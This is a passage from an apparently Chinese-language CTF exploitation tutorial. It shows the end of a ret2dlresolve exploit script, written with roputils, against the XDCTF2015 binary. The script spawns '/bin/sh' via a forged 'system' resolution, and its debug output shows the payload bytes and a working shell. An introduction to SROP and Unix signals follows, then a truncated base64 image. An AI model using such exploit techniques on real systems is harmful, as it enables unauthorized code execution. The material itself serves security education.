rop.dl_resolve_call(bss_base + <span class=\"number\">20</span>, bss_base)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\">buf = rop.string(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">20</span>, buf)</span><br><span class=\"line\"><span class=\"comment\">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class=\"line\">buf += rop.dl_resolve_data(bss_base + <span class=\"number\">20</span>, <span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">100</span>, buf)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。</p>\n<p>效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python roptool.py                       </span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 6114</span><br><span class=\"line\">[DEBUG] Received 0x17 bytes:</span><br><span class=\"line\">    &#x27;Welcome to XDCTF2015~!\\n&#x27;</span><br><span class=\"line\">[DEBUG] Sent 0x94 bytes:</span><br><span class=\"line\">    00000000  46 4c 68 78  52 36 67 6e  65 47 53 58  71 77 51 49  │FLhx│R6gn│eGSX│qwQI│</span><br><span class=\"line\">    00000010  32 43 6c 49  77 76 51 33  47 49 4a 59  50 74 6c 38  │2ClI│wvQ3│GIJY│Ptl8│</span><br><span class=\"line\">    00000020  57 54 68 4a  63 48 39 62  46 55 52 58  50 73 38 64  │WThJ│cH9b│FURX│Ps8d│</span><br><span class=\"line\">    00000030  72 4c 38 63  50 79 37 73  55 45 7a 32  6f 59 5a 42  │rL8c│Py7s│UEz2│oYZB│</span><br><span class=\"line\">    00000040  76 59 32 43  74 75 77 6f  70 56 61 44  6a 73 35 6b  │vY2C│tuwo│pVaD│js5k│</span><br><span class=\"line\">    00000050  41 77 78 77  49 72 7a 49  70 4d 31 67  52 6f 44 6f  │Awxw│IrzI│pM1g│RoDo│</span><br><span class=\"line\">    00000060  43 44 43 6e  45 31 50 48  53 73 64 30  6d 54 7a 5a  │CDCn│E1PH│Ssd0│mTzZ│</span><br><span class=\"line\">    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│</span><br><span class=\"line\">    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│</span><br><span class=\"line\">    00000090  40 a0 04 08                                         │@···││</span><br><span class=\"line\">    00000094</span><br><span class=\"line\">[DEBUG] Sent 0x64 bytes:</span><br><span class=\"line\">    00000000  2f 62 69 6e  2f 73 68 00  73 52 46 66  57 43 59 52  │/bin│/sh·│sRFf│WCYR│</span><br><span class=\"line\">    00000010  66 4c 35 52  78 49 4c 53  54 a0 04 08  07 e9 01 00  │fL5R│xILS│T···│····│</span><br><span class=\"line\">    00000020  6e 6b 45 32  52 76 73 6c  00 1e 00 00  00 00 00 00  │nkE2│Rvsl│····│····│</span><br><span class=\"line\">    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 74  │····│····│syst│em·t│</span><br><span class=\"line\">    00000040  5a 4f 4e 6c  6c 73 4b 5a  76 53 48 6e  38 37 49 47  │ZONl│lsKZ│vSHn│87IG│</span><br><span class=\"line\">    00000050  69 49 52 6c  50 44 38 67  45 77 75 6c  72 47 6f 67  │iIRl│PD8g│Ewul│rGog│</span><br><span class=\"line\">    00000060  55 41 52 4f                                         │UARO││</span><br><span class=\"line\">    00000064</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">$ ls</span><br><span class=\"line\">[DEBUG] Sent 0x3 bytes:</span><br><span class=\"line\">    &#x27;ls\\n&#x27;</span><br><span class=\"line\">[DEBUG] Received 0x8d bytes:</span><br><span class=\"line\">    &#x27;core\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n&#x27;</span><br><span class=\"line\">    &#x27;__init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n&#x27;</span><br><span class=\"line\">core         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py</span><br><span class=\"line\">__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py</span><br></pre></td></tr></table></figure>\n\n<p><strong>SROP</strong></p>\n<p>SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究<strong>Framing Signals — A Return to Portable Shellcode</strong>发表在安全顶级会SP2014上，被评选为当年的Best Student Papers。</p>\n<p><strong>signal机制</strong></p>\n<p>signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示</p>\n<p><img src=\"data:image/png;base64,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IENvcmUgNS40LjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj44MTY8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+MjY2PC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CkXEHR8AAEAASURBVHgB7J0HmFxV+cZPNtn0QgihRAktFEPvRXqR3hERUDqIglQBAZWOSAmggAhSpEn5UwQpoQhIlRo6oYTQQi8JqZtk/t/vu3sms7Mz2zKzO3fm/Z5ndu7ce8p33js797znK6dbxiRIhIAQEAJCQAgIASEgBISAEBACKUCgLgU6SkUhIASEgBAQAkJACAgBISAEhIAjIAKjL4IQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigoBISAEhIAQEAJCQAgIASEgAqPvgBAQAkJACAgBISAEhIAQEAKpQUAEJjW3SooKASEgBISAEBACQkAICAEhIAKj74AQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigoBISAEhIAQEAJCQAgIASEgAqPvgBAQAkJACAgBISAEhIAQEAKpQUAEJjW3SooKASEgBISAEBACQkAICAEhIAKj74AQEAJCQAgIASEgBISAEBACqUFABCY1t0qKCgEhIASEgBAQAkJACAgBISACo++AEBACQkAICAEhIASEgBAQAqlBQAQmNbdKigoBISAEhIAQEAJCQAgIASEgAqPvgBAQAkJACAgBISAEhIAQEAKpQUAEJjW3SooK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